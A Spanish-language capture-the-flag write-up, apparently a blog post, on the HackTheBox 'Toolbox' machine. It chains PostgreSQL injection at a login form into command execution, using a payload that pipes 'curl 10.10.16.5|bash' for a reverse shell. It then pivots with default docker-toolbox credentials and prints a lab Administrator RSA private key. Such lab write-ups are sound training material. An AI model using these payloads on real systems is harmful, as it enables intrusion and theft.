---
layout: post
title: Toolbox
date: 2023-03-22
description:
img:
fig-caption:
tags: [eWPT, OSCP (Intrusión), eJPT, eCPPTv2]
---
___

<center><img src="/writeups/assets/img/Toolbox-htb/Toolbox.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* PostgreSQL Inyection

* Credenciales por defecto

* Pivoting

* Abuso de montura (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.236 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 18:26 GMT
Nmap scan report for 10.10.10.236
Host is up (0.059s latency).
Not shown: 63304 closed tcp ports (reset), 2217 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.236 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-22 18:27 GMT
Nmap scan report for 10.10.10.236
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b1aa18199eaf79602192e6e97045a3f (RSA)
|   256 a24b5ac70ff399a13aca7d542876b2dd (ECDSA)
|_  256 ea08966023e2f44f8d05b31841352339 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.38 (Debian)
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
| Not valid before: 2020-02-18T17:45:56
|_Not valid after:  2021-02-17T17:45:56
|_ssl-date: TLS randomness does not represent time
|_http-title: MegaLogistics
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-22T18:28:44
|_  start_date: N/A
|_clock-skew: -3s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.80 seconds
```

Añado el subdominio ```admin.megalogistic.com``` y el dominio ```megalogistic.com``` al ```/etc/hosts```

## Puerto 21 (FTP)

Puedo conectarme como el usuario ```anonymous```

```null
ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:rubbx): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||52601|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
ftp> 
```

Hay un EXE que me puedo descargar

```null
ftp> get docker-toolbox.exe
local: docker-toolbox.exe remote: docker-toolbox.exe
229 Entering Extended Passive Mode (|||60501|)
150 Opening data channel for file download from server of "/docker-toolbox.exe"
100% |********************************************************************************************************************************************************************|   231 MiB    1.48 MiB/s    00:00 ETA
226 Successfully transferred "/docker-toolbox.exe"
242520560 bytes received in 02:35 (1.48 MiB/s)
```

## Puerto 445 (SMB)

Con ```crackmapexec``` realizo un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.236
SMB         10.10.10.236    445    TOOLBOX          [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
```

No puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.236 -u 'null'
[!] Authentication error on 10.10.10.236
```

## Puerto 443 (HTTPS)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb https://10.10.10.236/
https://10.10.10.236/ [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.10.236], JQuery[3.3.1], Script, Title[MegaLogistics]
```

En el subdominio ```admin.megalogistic.com``` hay un panel de inicio de sesión

```null
whatweb https://admin.megalogistic.com
https://admin.megalogistic.com [200 OK] Apache[2.4.38], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.10.236], PHP[7.3.14], PasswordField[password], Title[Administrator Login], X-Powered-By[PHP/7.3.14]
```

<img src="/writeups/assets/img/Toolbox-htb/2.png" alt="">

Introduzco una comilla y veo un error de PostgreSQL

```null
username=admin'&password=admin
```

```null
</b>:  pg_num_rows() expects parameter 1 to be resource, bool given in <b>/var/www/admin/index.php</b>
```

Me puedo loggear con la siguiente query:

```null
username=';select pg_sleep(10);-- -&password='
```

<img src="/writeups/assets/img/Toolbox-htb/3.png" alt="">

Pero para algunas versiones de PostgresSQL es posible llegar a obtener RCE. Todo está detallado en [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)

```null
username=';CREATE+TABLE+cmd_exec(cmd_output+text);--+-&password='
```

```null
username=';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.16.5/pwned';--+-&password='
```

Recibo la petición

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.236 - - [23/Mar/2023 09:52:08] code 404, message File not found
10.10.10.236 - - [23/Mar/2023 09:52:08] "GET /pwned HTTP/1.1" 404 -
```

Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell al interpretarlo

```null
username=';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.16.5|bash';--+-&password='
```

Limpio la tabla que había creado

```null
username=';SELECT+*+FROM+cmd_exec;--+-&password='
```

```null
username=';DROP+TABLE+IF+EXISTS+cmd_exec;--+-&password='
```

Gano acceso a un contenedor

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.236] 54573
bash: cannot set terminal process group (9199): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ export TERM=xterm
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ export SHELL=bash
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ stty rows 55 columns 209
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ whoami
postgres
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ hostname -I
172.17.0.2 
```

Puedo ver la primera flag

```null
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt 
f0183e44378ea9774433e2ca6ac78c6a  flag.txt
```

# Escalada

Las credenciales por defecto para ```docker-toolbox``` son ```docker:tcuser```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery. La IP ```172.17.0.1``` tiene el SSH abierto

```null
postgres@bc56e3cc55e9:/tmp$ ./nmap --min-rate 5000 -n -Pn 172.17.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-23 10:09 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00025s latency).
Not shown: 1205 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https
```

Me puedo conectar por SSH a la ```172.17.0.1```

```null
postgres@bc56e3cc55e9:/tmp$ ssh docker@172.17.0.1
docker@172.17.0.1's password: 
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ 
```

En la raíz hay un directorio que contiene la montura del Windows

```null
docker@box:/$ ls                                                                                                                                                                                                
bin           home          linuxrc       root          sys
c             init          mnt           run           tmp
dev           lib           opt           sbin          usr
etc           lib64         proc          squashfs.tgz  var
docker@box:/$ cd c/                                                                                                                                                                                             
docker@box:/c$ ls                                                                                                                                                                                               
Users
docker@box:/c$ cd Users/                                                                                                                                                                                        
docker@box:/c/Users$ ls                                                                                                                                                                                         
Administrator  Default        Public         desktop.ini
All Users      Default User   Tony
```

Puedo ver la segunda flag

```null
docker@box:/c/Users$ cat ./Administrator/Desktop/root.txt
cc9a0b76ac17f8f475250738b96261b3
```

Se puede ganar acceso por SSH con la ```id_rsa```

```null
docker@box:/c/Users/Administrator/.ssh$ cat id_rsa                                                                                                                                                              
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvo4SLlg/dkStA4jDUNxgF8kbNAF+6IYLNOOCeppfjz6RSOQv
Md08abGynhKMzsiiVCeJoj9L8GfSXGZIfsAIWXn9nyNaDdApoF7Mfm1KItgO+W9m
M7lArs4zgBzMGQleIskQvWTcKrQNdCDj9JxNIbhYLhJXgro+u5dW6EcYzq2MSORm
7A+eXfmPvdr4hE0wNUIwx2oOPr2duBfmxuhL8mZQWu5U1+Ipe2Nv4fAUYhKGTWHj
4ocjUwG9XcU0iI4pcHT3nXPKmGjoPyiPzpa5WdiJ8QpME398Nne4mnxOboWTp3jG
aJ1GunZCyic0iSwemcBJiNyfZChTipWmBMK88wIDAQABAoIBAH7PEuBOj+UHrM+G
Stxb24LYrUa9nBPnaDvJD4LBishLzelhGNspLFP2EjTJiXTu5b/1E82qK8IPhVlC
JApdhvDsktA9eWdp2NnFXHbiCg0IFWb/MFdJd/ccd/9Qqq4aos+pWH+BSFcOvUlD
vg+BmH7RK7V1NVFk2eyCuS4YajTW+VEwD3uBAl5ErXuKa2VP6HMKPDLPvOGgBf9c
l0l2v75cGjiK02xVu3aFyKf3d7t/GJBgu4zekPKVsiuSA+22ZVcTi653Tum1WUqG
MjuYDIaKmIt9QTn81H5jAQG6CMLlB1LZGoOJuuLhtZ4qW9fU36HpuAzUbG0E/Fq9
jLgX0aECgYEA4if4borc0Y6xFJxuPbwGZeovUExwYzlDvNDF4/Vbqnb/Zm7rTW/m
YPYgEx/p15rBh0pmxkUUybyVjkqHQFKRgu5FSb9IVGKtzNCtfyxDgsOm8DBUvFvo
qgieIC1S7sj78CYw1stPNWS9lclTbbMyqQVjLUvOAULm03ew3KtkURECgYEA17Nr
Ejcb6JWBnoGyL/yEG44h3fHAUOHpVjEeNkXiBIdQEKcroW9WZY9YlKVU/pIPhJ+S
7s++kIu014H+E2SV3qgHknqwNIzTWXbmqnclI/DSqWs19BJlD0/YUcFnpkFG08Xu
iWNSUKGb0R7zhUTZ136+Pn9TEGUXQMmBCEOJLcMCgYBj9bTJ71iwyzgb2xSi9sOB
MmRdQpv+T2ZQQ5rkKiOtEdHLTcV1Qbt7Ke59ZYKvSHi3urv4cLpCfLdB4FEtrhEg
5P39Ha3zlnYpbCbzafYhCydzTHl3k8wfs5VotX/NiUpKGCdIGS7Wc8OUPBtDBoyi
xn3SnIneZtqtp16l+p9pcQKBgAg1Xbe9vSQmvF4J1XwaAfUCfatyjb0GO9j52Yp7
MlS1yYg4tGJaWFFZGSfe+tMNP+XuJKtN4JSjnGgvHDoks8dbYZ5jaN03Frvq2HBY
RGOPwJSN7emx4YKpqTPDRmx/Q3C/sYos628CF2nn4aCKtDeNLTQ3qDORhUcD5BMq
bsf9AoGBAIWYKT0wMlOWForD39SEN3hqP3hkGeAmbIdZXFnUzRioKb4KZ42sVy5B
q3CKhoCDk8N+97jYJhPXdIWqtJPoOfPj6BtjxQEBoacW923tOblPeYkI9biVUyIp
BYxKDs3rNUsW1UUHAvBh0OYs+v/X+Z/2KVLLeClznDJWh/PNqF5I
-----END RSA PRIVATE KEY-----
```

```null
ssh Administrator@10.10.10.236 -i id_rsa

Microsoft Windows [Version 10.0.17763.1039] 
(c) 2018 Microsoft Corporation. All rights reserved. 

administrator@TOOLBOX C:\Users\Administrator>        
```